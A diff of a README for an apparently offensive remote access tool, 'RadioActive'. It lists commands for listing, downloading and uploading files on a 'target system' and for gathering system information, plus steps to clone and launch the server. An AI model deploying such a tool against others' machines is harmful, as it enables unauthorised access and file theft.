@@ -5,22 +5,26 @@ This tool creates a server with your own IP, and a client file that is in the Te
 
 # Server commands 
 
-ls : Lists all files (You can also use commands related to the operating system )
+- ls : Lists all files (You can also use commands related to the operating system )
 
-0 : Say the name of the desired file and then give the name of the output to be copied from the target system 
+- 0 : Say the name of the desired file and then give the name of the output to be copied from the target system 
 
-1 : Download the file from the target system 
+- 1 : Download the file from the target system 
 
-2 : Upload the file on the target system 
+- 2 : Upload the file on the target system 
 
-3 : Getting target system information 
+- 3 : Getting target system information 
 
 # orders 
 
 ```
 pkg install git
+
 pkg install python2
+
 git clone https://github.com/esfelurm/RadioActive.git
+
 cd /RadioActive
+
 python2 server.py
 ```
